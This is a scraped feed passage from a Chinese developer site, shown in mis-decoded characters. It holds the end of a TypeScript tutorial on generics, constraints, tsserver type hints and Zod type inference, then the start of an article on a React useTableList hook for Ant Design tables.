<p>æ³›å‹çš„æ ¸å¿ƒä»·å€¼å°±æ˜¯ï¼š<strong>è®©ç±»å‹ä¿¡æ¯åœ¨å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­"æµåŠ¨"ï¼Œè€Œä¸æ˜¯è¢«æŠ¹æ‰</strong>ã€‚</p>
<h4 data-id="heading-42">æ·±å…¥ç†è§£"ç±»å‹æµåŠ¨"</h4>
<p><strong>ä»€ä¹ˆæ˜¯ç±»å‹è¢«"æŠ¹æ‰"ï¼Ÿ</strong></p>
<p>å½“ä½ ç”¨å®½æ³›çš„ç±»å‹ï¼ˆå¦‚ <code>Record&lt;string, unknown&gt;</code>ã€<code>any</code>ã€<code>object</code>ï¼‰ä½œä¸ºå‚æ•°ç±»å‹æ—¶ï¼ŒTS åªèƒ½è®°ä½è¿™ä¸ªå®½æ³›çš„ç±»å‹ï¼Œå…·ä½“çš„ç±»å‹ä¿¡æ¯å°±ä¸¢å¤±äº†ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">identity</span>(<span class="hljs-params">value: <span class="hljs-built_in">object</span></span>): <span class="hljs-built_in">object</span> {
  <span class="hljs-keyword">return</span> value;
}

<span class="hljs-keyword">const</span> user = <span class="hljs-title function_">identity</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'john'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> });
<span class="hljs-comment">// user çš„ç±»å‹æ˜¯ object</span>
<span class="hljs-comment">// TS å·²ç»"å¿˜è®°"äº†å®ƒåŸæœ¬æ˜¯ { name: string; age: number }</span>
</code></pre>
<p>ç±»å‹ä¿¡æ¯åœ¨è¿›å…¥å‡½æ•°æ—¶è¢«"æŠ¹æ‰"äº†ï¼Œå‡ºæ¥åå°±åªå‰©ä¸‹ <code>object</code>ã€‚</p>
<p><strong>ä»€ä¹ˆæ˜¯ç±»å‹"æµåŠ¨"ï¼Ÿ</strong></p>
<p>æ³›å‹è®© TS æŠŠå…·ä½“ç±»å‹"å¸¦ç€èµ°"ï¼Œä»è¾“å…¥æµåŠ¨åˆ°è¾“å‡ºï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> identity&lt;T&gt;(<span class="hljs-attr">value</span>: T): T {
  <span class="hljs-keyword">return</span> value;
}

<span class="hljs-keyword">const</span> user = <span class="hljs-title function_">identity</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'john'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> });
<span class="hljs-comment">// user çš„ç±»å‹æ˜¯ { name: string; age: number }</span>
<span class="hljs-comment">// TS "è®°ä½"äº†å…·ä½“ç±»å‹ï¼Œå¹¶è®©å®ƒæµåŠ¨åˆ°è¿”å›å€¼</span>
</code></pre>
<p><strong>æµåŠ¨è¿‡ç¨‹å¯è§†åŒ–</strong></p>
<pre><code class="hljs language-css" lang="css">æ²¡æœ‰æ³›å‹ï¼ˆç±»å‹è¢«æŠ¹æ‰ï¼‰ï¼š
{ name: string; age: number } â”€â”€è¿›å…¥å‡½æ•°â”€â”€â–º <span class="hljs-selector-tag">object</span> â”€â”€è¿”å›â”€â”€â–º <span class="hljs-selector-tag">object</span>
                                    â†‘
                              ç±»å‹ä¿¡æ¯åœ¨è¿™é‡Œä¸¢å¤±

æœ‰æ³›å‹ï¼ˆç±»å‹æµåŠ¨ï¼‰ï¼š
{ name: string; age: number } â”€â”€è¿›å…¥å‡½æ•°â”€â”€â–º T â”€â”€è¿”å›â”€â”€â–º { name: string; age: number }
                                    â†‘              â†‘
                              T è®°ä½äº†å…·ä½“ç±»å‹    åŸæ ·æµå‡º
</code></pre>
<p><strong>åœ¨ useForm ä¸­çš„ä½“ç°</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç±»å‹æµåŠ¨çš„å®Œæ•´é“¾è·¯ï¼š</span>
<span class="hljs-title function_">useForm</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> })
    â”‚
    â–¼ è¾“å…¥ç±»å‹ { <span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> }
    â”‚
    â–¼ T æ•è·è¿™ä¸ªç±»å‹
    â”‚
    â–¼ useState&lt;T&gt; ä½¿ç”¨è¿™ä¸ªç±»å‹
    â”‚
    â–¼ setField&lt;K <span class="hljs-keyword">extends</span> keyof T&gt; ä½¿ç”¨è¿™ä¸ªç±»å‹
    â”‚
    â–¼ è¿”å›çš„ values ä¿æŒè¿™ä¸ªç±»å‹
    â”‚
    â–¼ è°ƒç”¨æ–¹æ‹¿åˆ°çš„ values ç±»å‹æ˜¯ { <span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> }
</code></pre>
<p>æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œ<code>{ username: string; age: number }</code> è¿™ä¸ªå…·ä½“ç±»å‹è¢« <code>T</code> æ•è·åï¼Œä¸€è·¯æµåŠ¨åˆ°æœ€ç»ˆçš„è¿”å›å€¼ï¼Œæ²¡æœ‰ä»»ä½•åœ°æ–¹ä¸¢å¤±ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆ"æµåŠ¨"å¾ˆé‡è¦ï¼Ÿ</strong></p>
<p>å› ä¸ºç±»å‹çš„ä»·å€¼åœ¨äº<strong>ä½¿ç”¨æ—¶</strong>ã€‚å¦‚æœç±»å‹åœ¨å‡½æ•°è°ƒç”¨åä¸¢å¤±äº†ï¼Œåç»­ä»£ç å°±æ— æ³•è·å¾—ç±»å‹æ£€æŸ¥å’Œ IDE æç¤ºï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç±»å‹ä¸¢å¤±åï¼Œåç»­ä»£ç "è£¸å¥”"</span>
<span class="hljs-keyword">const</span> { values } = <span class="hljs-title function_">useFormBad</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> });
values.<span class="hljs-property">usernam</span> = <span class="hljs-string">'test'</span>;  <span class="hljs-comment">// æ‹¼å†™é”™è¯¯ï¼Œä¸æŠ¥é”™</span>
values.<span class="hljs-property">age</span> = <span class="hljs-string">'25'</span>;        <span class="hljs-comment">// ç±»å‹é”™è¯¯ï¼Œä¸æŠ¥é”™</span>

<span class="hljs-comment">// ç±»å‹æµåŠ¨åï¼Œåç»­ä»£ç å—ä¿æŠ¤</span>
<span class="hljs-keyword">const</span> { values } = <span class="hljs-title function_">useFormGood</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> });
values.<span class="hljs-property">usernam</span> = <span class="hljs-string">'test'</span>;  <span class="hljs-comment">// âŒ ç¼–è¯‘é”™è¯¯ï¼šå±æ€§ä¸å­˜åœ¨</span>
values.<span class="hljs-property">age</span> = <span class="hljs-string">'25'</span>;        <span class="hljs-comment">// âŒ ç¼–è¯‘é”™è¯¯ï¼šç±»å‹ä¸åŒ¹é…</span>
</code></pre>
<p><strong>ä¸€å¥è¯æ€»ç»“</strong>ï¼šæ³›å‹å°±åƒä¸€ä¸ª"ç±»å‹å˜é‡"ï¼Œå®ƒåœ¨å‡½æ•°å…¥å£æ•è·å…·ä½“ç±»å‹ï¼Œç„¶åæŠŠè¿™ä¸ªç±»å‹å¸¦åˆ°å‡½æ•°å†…éƒ¨å’Œå‡ºå£ï¼Œè®©æ•´ä¸ªè°ƒç”¨é“¾è·¯éƒ½èƒ½äº«å—åˆ°ç±»å‹å®‰å…¨ã€‚</p>
<h4 data-id="heading-43">çº¦æŸçš„æ„ä¹‰</h4>
<p><code>extends</code> çº¦æŸæœ‰ä¸¤ä¸ªä½œç”¨ï¼š</p>
<ol>
<li><strong>é™åˆ¶è°ƒç”¨è€…</strong>ï¼šåªèƒ½ä¼ å…¥ç¬¦åˆçº¦æŸçš„ç±»å‹ï¼Œä¼ é”™äº†ç¼–è¯‘æŠ¥é”™</li>
<li><strong>ä¿éšœå®ç°è€…</strong>ï¼šå‡½æ•°å†…éƒ¨å¯ä»¥å®‰å…¨åœ°å‡è®¾ T æ˜¯å¯¹è±¡ç±»å‹ï¼Œä½¿ç”¨ <code>keyof T</code> ç­‰æ“ä½œ</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> useForm&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;&gt;(<span class="hljs-attr">initialValues</span>: T) {
  <span class="hljs-comment">// å› ä¸º T extends Record&lt;string, unknown&gt;</span>
  <span class="hljs-comment">// æ‰€ä»¥ keyof T ä¸€å®šæ˜¯ stringï¼ˆå¯¹è±¡çš„ keyï¼‰</span>
  <span class="hljs-comment">// è¿™é‡Œçš„æ“ä½œæ˜¯ç±»å‹å®‰å…¨çš„</span>
  <span class="hljs-keyword">const</span> <span class="hljs-attr">keys</span>: (keyof T)[] = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(initialValues) <span class="hljs-keyword">as</span> (keyof T)[];
}
</code></pre>
<h4 data-id="heading-44">æ€»ç»“</h4>

























<table><thead><tr><th>æ¦‚å¿µ</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>æ³›å‹å˜é‡ <code>T</code></td><td>ç±»å‹å ä½ç¬¦ï¼Œè°ƒç”¨æ—¶ç”±å‚æ•°åæ¨ç¡®å®š</td></tr><tr><td><code>extends</code> çº¦æŸ</td><td>é™åˆ¶ T å¿…é¡»æ»¡è¶³æŸç§ç»“æ„ï¼Œå¦åˆ™ç¼–è¯‘æŠ¥é”™</td></tr><tr><td>åæ¨æœºåˆ¶</td><td>TS æ ¹æ®å®é™…ä¼ å…¥çš„å‚æ•°ï¼Œè‡ªåŠ¨æ¨æ–­å‡º T çš„å…·ä½“ç±»å‹</td></tr><tr><td>çº¦æŸ + åæ¨</td><td>æ—¢ä¿è¯ç±»å‹å®‰å…¨ï¼ˆçº¦æŸï¼‰ï¼Œåˆä¿ç•™å…·ä½“ç±»å‹ä¿¡æ¯ï¼ˆåæ¨ï¼‰</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-45">å…­ã€VSCode å¦‚ä½•è·å¾—ç±»å‹æç¤º</h2>
<h3 data-id="heading-46">æ ¸å¿ƒï¼šTypeScript Language Server</h3>
<pre><code class="hljs language-arduino" lang="arduino">ä½ å†™ä»£ç  â†’ VSCode â†’ TypeScript Language <span class="hljs-built_in">Server</span> â†’ ç±»å‹æ¨å¯¼å¼•æ“
                              â†“
                    è¿”å›ç±»å‹ä¿¡æ¯ã€é”™è¯¯ã€è¡¥å…¨å»ºè®®
                              â†“
                    VSCode æ˜¾ç¤ºæç¤º/æŠ¥é”™/è¡¥å…¨
</code></pre>
<h3 data-id="heading-47">å·¥ä½œæœºåˆ¶</h3>
<ol>
<li>VSCode å†…ç½® TS æ‰©å±•ï¼Œå¯åŠ¨æ—¶è‡ªåŠ¨è¿è¡Œ <code>tsserver</code></li>
<li>æ¯æ¬¡æ•²é”®ç›˜ï¼ŒVSCode é€šè¿‡ LSP åè®®æŠŠä»£ç å‘ç»™ tsserver</li>
<li>tsserver å®æ—¶åˆ†æï¼šè§£æ AST â†’ è¿è¡Œç±»å‹æ¨å¯¼ â†’ è¿”å›ç»“æœ</li>
<li>VSCode æ¸²æŸ“ï¼šçº¢è‰²æ³¢æµªçº¿ã€æ‚¬æµ®æç¤ºã€è‡ªåŠ¨è¡¥å…¨åˆ—è¡¨</li>
</ol>
<h3 data-id="heading-48">åŠŸèƒ½å¯¹åº”</h3>

























<table><thead><tr><th>åŠŸèƒ½</th><th>èƒŒååœ¨åšä»€ä¹ˆ</th></tr></thead><tbody><tr><td>æ‚¬æµ®æ˜¾ç¤ºç±»å‹</td><td>tsserver æ¨å¯¼å‡ºç±»å‹è¿”å›ç»™ VSCode</td></tr><tr><td>è‡ªåŠ¨è¡¥å…¨</td><td>tsserver è¿”å›å½“å‰ä¸Šä¸‹æ–‡å¯ç”¨çš„å±æ€§/æ–¹æ³•</td></tr><tr><td>çº¢è‰²æ³¢æµªçº¿</td><td>tsserver æ£€æµ‹åˆ°ç±»å‹é”™è¯¯</td></tr><tr><td>F12 è·³è½¬å®šä¹‰</td><td>tsserver æ‰¾åˆ°ç¬¦å·å®šä¹‰ä½ç½®</td></tr></tbody></table>
<p>ç±»å‹æ¨å¯¼çš„"æ™ºèƒ½"å…¨åœ¨ TypeScript ç¼–è¯‘å™¨é‡Œï¼ŒVSCode åªæ˜¯æ˜¾ç¤ºå±‚ã€‚</p>
<hr/>
<h2 data-id="heading-49">æ€»ç»“</h2>





































<table><thead><tr><th>æ¦‚å¿µ</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>TypeScript ç±»å‹</td><td>ç¼–è¯‘æ—¶æ£€æŸ¥ä½ å†™çš„ä»£ç </td></tr><tr><td>Zod</td><td>è¿è¡Œæ—¶éªŒè¯å¤–éƒ¨æ•°æ® + Schema è‡ªåŠ¨å¯¼å‡ºç±»å‹</td></tr><tr><td><code>z.infer</code></td><td>Schema å’Œç±»å‹ç»Ÿä¸€ï¼ŒSingle Source of Truth</td></tr><tr><td>æ³›å‹</td><td>è®©ç±»å‹å¯å¤ç”¨ï¼Œè®©ç±»å‹ä¿¡æ¯"æµåŠ¨"</td></tr><tr><td>æ¡ä»¶ç±»å‹</td><td>æ ¹æ®æ¡ä»¶è¿”å›ä¸åŒç±»å‹</td></tr><tr><td><code>infer</code></td><td>ä»å¤æ‚ç±»å‹ä¸­æå–éƒ¨åˆ†</td></tr><tr><td>LSP</td><td>ç¼–è¾‘å™¨è·å¾—ç±»å‹æç¤ºçš„æ¡¥æ¢</td></tr></tbody></table>
<h3 data-id="heading-50">æ ¸å¿ƒç†å¿µ</h3>
<p><strong>TypeScript ç±»å‹æ¨æ–­</strong>ï¼šæŠŠè¿è¡Œæ—¶é”™è¯¯å˜æˆç¼–è¯‘æ—¶é”™è¯¯ã€‚é€šè¿‡æ³›å‹ã€æ¡ä»¶ç±»å‹ç­‰æœºåˆ¶ï¼Œè®©ç±»å‹ä¿¡æ¯åœ¨ä»£ç ä¸­"æµåŠ¨"ï¼Œåœ¨ç¼–è¯‘é˜¶æ®µå°±èƒ½å‘ç°å­—æ®µæ‹¼å†™é”™è¯¯ã€ç±»å‹ä¸åŒ¹é…ç­‰é—®é¢˜ã€‚</p>
<p>ä»¥ <code>setField</code> ä¸ºä¾‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// âŒ æ²¡æœ‰ç±»å‹æ¨æ–­çš„å†™æ³•</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">setFieldBad</span>(<span class="hljs-params">field: <span class="hljs-built_in">string</span>, value: <span class="hljs-built_in">unknown</span></span>) {
  <span class="hljs-comment">// ...</span>
}

<span class="hljs-title function_">setFieldBad</span>(<span class="hljs-string">'usernmae'</span>, <span class="hljs-string">'john'</span>);  <span class="hljs-comment">// æ‹¼å†™é”™è¯¯ï¼Œç¼–è¯‘ä¸æŠ¥é”™ï¼Œè¿è¡Œæ—¶å­—æ®µæ²¡æ›´æ–°</span>
<span class="hljs-title function_">setFieldBad</span>(<span class="hljs-string">'age'</span>, <span class="hljs-string">'25'</span>);         <span class="hljs-comment">// ç±»å‹é”™è¯¯ï¼Œç¼–è¯‘ä¸æŠ¥é”™ï¼Œè¿è¡Œæ—¶é€»è¾‘å‡ºé—®é¢˜</span>

<span class="hljs-comment">// âœ… æœ‰ç±»å‹æ¨æ–­çš„å†™æ³•</span>
<span class="hljs-keyword">function</span> setField&lt;K <span class="hljs-keyword">extends</span> keyof T&gt;(<span class="hljs-attr">field</span>: K, <span class="hljs-attr">value</span>: T[K]) {
  <span class="hljs-comment">// ...</span>
}

<span class="hljs-keyword">const</span> { setField } = <span class="hljs-title function_">useForm</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> });

<span class="hljs-title function_">setField</span>(<span class="hljs-string">'usernmae'</span>, <span class="hljs-string">'john'</span>);  <span class="hljs-comment">// âŒ ç¼–è¯‘é”™è¯¯ï¼š'usernmae' ä¸åœ¨ 'username' | 'age' ä¸­</span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'age'</span>, <span class="hljs-string">'25'</span>);         <span class="hljs-comment">// âŒ ç¼–è¯‘é”™è¯¯ï¼šç±»å‹ 'string' ä¸èƒ½èµ‹å€¼ç»™ç±»å‹ 'number'</span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'age'</span>, <span class="hljs-number">25</span>);           <span class="hljs-comment">// âœ… ç¼–è¯‘é€šè¿‡</span>
</code></pre>
<p>å…³é”®åœ¨äº <code>K extends keyof T</code> å’Œ <code>T[K]</code> çš„é…åˆï¼š</p>
<ul>
<li>TS æ ¹æ®ä½ ä¼ å…¥çš„åˆå§‹å€¼ï¼Œæ¨æ–­å‡º <code>T = { username: string; age: number }</code></li>
<li>è°ƒç”¨ <code>setField('age', ...)</code> æ—¶ï¼Œæ¨æ–­å‡º <code>K = 'age'</code>ï¼Œè¿›è€Œæ¨æ–­å‡º <code>value</code> å¿…é¡»æ˜¯ <code>number</code></li>
<li>å­—æ®µåå’Œå€¼ç±»å‹çš„å¯¹åº”å…³ç³»ï¼Œåœ¨ç¼–è¯‘æ—¶å°±è¢«é”æ­»äº†</li>
</ul>
<p>è¿™å°±æ˜¯ç±»å‹æ¨æ–­çš„å¨åŠ›ï¼š<strong>ä¸æ˜¯ç®€å•çš„ç±»å‹æ ‡æ³¨ï¼Œè€Œæ˜¯è®© TS æ ¹æ®ä¸Šä¸‹æ–‡è‡ªåŠ¨æ¨å¯¼å‡ºçº¦æŸå…³ç³»ï¼ŒæŠŠæœ¬è¯¥è¿è¡Œæ—¶æ‰æš´éœ²çš„ bug æå‰åˆ°ç¼–è¯‘æ—¶æ‹¦æˆª</strong>ã€‚</p>
<p><strong>Zod çš„æ ¸å¿ƒä»·å€¼</strong>ï¼šSchema å³ç±»å‹ï¼ˆSingle Source of Truthï¼‰ã€‚</p>
<ul>
<li>ä¼ ç»Ÿæ–¹å¼ï¼šæ‰‹å†™ interface + æ‰‹å†™éªŒè¯é€»è¾‘ï¼Œä¸¤ä»½ä»£ç å®¹æ˜“ä¸åŒæ­¥</li>
<li>Zod æ–¹å¼ï¼šåªå†™ä¸€æ¬¡ Schemaï¼Œé€šè¿‡ <code>z.infer</code> è‡ªåŠ¨å¯¼å‡º TypeScript ç±»å‹</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ä¸€å¤„å®šä¹‰ï¼Œä¸¤å¤„å—ç›Š</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">UserSchema</span> = z.<span class="hljs-title function_">object</span>({ <span class="hljs-attr">name</span>: z.<span class="hljs-title function_">string</span>(), <span class="hljs-attr">age</span>: z.<span class="hljs-title function_">number</span>() });
<span class="hljs-keyword">type</span> <span class="hljs-title class_">User</span> = z.<span class="hljs-property">infer</span>&lt;<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">UserSchema</span>&gt;;  <span class="hljs-comment">// ç¼–è¯‘æ—¶ç±»å‹</span>
<span class="hljs-title class_">UserSchema</span>.<span class="hljs-title function_">parse</span>(data);                   <span class="hljs-comment">// è¿è¡Œæ—¶éªŒè¯</span>
</code></pre>
<p><strong>ä¸¤è€…çš„å…³ç³»</strong>ï¼š</p>
<ul>
<li>TypeScript ä¿è¯<strong>ä½ å†™çš„ä»£ç </strong>ç±»å‹æ­£ç¡®ï¼ˆç¼–è¯‘æ—¶ï¼‰</li>
<li>Zod ä¿è¯<strong>å¤–éƒ¨æ•°æ®</strong>ç¬¦åˆé¢„æœŸï¼ˆè¿è¡Œæ—¶ï¼‰</li>
<li><code>z.infer</code> è®© Zod Schema å’Œ TS ç±»å‹ç»Ÿä¸€ï¼Œé¿å…é‡å¤å®šä¹‰</li>
</ul>
<p>ä¸¤è€…äº’è¡¥ï¼Œè¦†ç›–äº†ç¼–è¯‘æ—¶å’Œè¿è¡Œæ—¶çš„ç±»å‹å®‰å…¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸš€ ä»é‡å¤ CRUD åˆ°å·¥ç¨‹åŒ–å°è£…ï¼šæˆ‘æ˜¯å¦‚ä½•è®¾è®¡ useTableList ç»Ÿä¸€åˆ—è¡¨é€»è¾‘çš„]]></title>    <link>https://juejin.cn/post/7592815497847488575</link>    <guid>https://juejin.cn/post/7592815497847488575</guid>    <pubDate>2026-01-08T09:29:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592815497847488575" data-draft-id="7592815497847472191" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸš€ ä»é‡å¤ CRUD åˆ°å·¥ç¨‹åŒ–å°è£…ï¼šæˆ‘æ˜¯å¦‚ä½•è®¾è®¡ useTableList ç»Ÿä¸€åˆ—è¡¨é€»è¾‘çš„"/> <meta itemprop="keywords" content="React.js,Ant Design,JavaScript"/> <meta itemprop="datePublished" content="2026-01-08T09:29:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="basestone"/> <meta itemprop="url" content="https://juejin.cn/user/2647279728853518"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸš€ ä»é‡å¤ CRUD åˆ°å·¥ç¨‹åŒ–å°è£…ï¼šæˆ‘æ˜¯å¦‚ä½•è®¾è®¡ useTableList ç»Ÿä¸€åˆ—è¡¨é€»è¾‘çš„
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2647279728853518/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    basestone
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:29:41.000Z" title="Thu Jan 08 2026 09:29:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    15
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ä¸­åå°é¡¹ç›®ä¸­ï¼Œæœ€å¸¸è§çš„é¡µé¢ä¸æ˜¯è¡¨å•ï¼Œè€Œæ˜¯åˆ—è¡¨é¡µã€‚<br/>
çœŸæ­£æ¶ˆè€—æ—¶é—´çš„ï¼Œå¾€å¾€ä¸æ˜¯ä¸šåŠ¡å¤æ‚åº¦ï¼Œè€Œæ˜¯åˆ†é¡µã€æ’åºã€loadingã€æŸ¥è¯¢å‚æ•°åŒæ­¥è¿™äº›é‡å¤åŠ³åŠ¨ã€‚</p>
<p>è¿™ç¯‡æ–‡ç« åˆ†äº«æˆ‘åœ¨é¡¹ç›®ä¸­å°è£…çš„ä¸€ä¸ª Hook â€”â€” <strong>useTableList</strong>ï¼Œç”¨äºç»Ÿä¸€ç®¡ç† Ant Design Table çš„åˆ—è¡¨è¡Œä¸ºã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€ä¸ºä»€ä¹ˆè¦å°è£…è¡¨æ ¼ Hookï¼Ÿ</h2>
<p>åœ¨æ²¡æœ‰å°è£…ä¹‹å‰ï¼Œä¸€ä¸ªåˆ—è¡¨é¡µé€šå¸¸è¦å¤„ç†ï¼š</p>
<ul>
<li>loading çŠ¶æ€</li>
